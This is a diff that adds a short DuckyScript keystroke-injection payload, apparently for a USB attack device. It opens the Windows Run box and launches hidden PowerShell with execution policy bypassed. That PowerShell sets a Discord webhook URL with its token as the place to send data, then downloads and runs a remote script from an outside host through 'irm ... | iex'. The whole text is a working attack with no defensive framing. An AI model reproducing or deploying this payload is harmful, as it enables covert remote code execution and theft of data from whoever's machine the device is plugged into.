@@ -1,0 +1,5 @@
+GUI r
+DELAY 500
+STRING powershell -w h -ep bypass $dc='https://discordapp.com/api/webhooks/1287930563402924112/7i_MKNW3xnJc-hWpfS8dLSILaSS-2Cs6Vf0SOT9KQyA2pWcwXrcAnL3IiVP8tnhDCqQ6';irm https://jakoby.lol/hgw | iex
+DELAY 1000
+ENTER
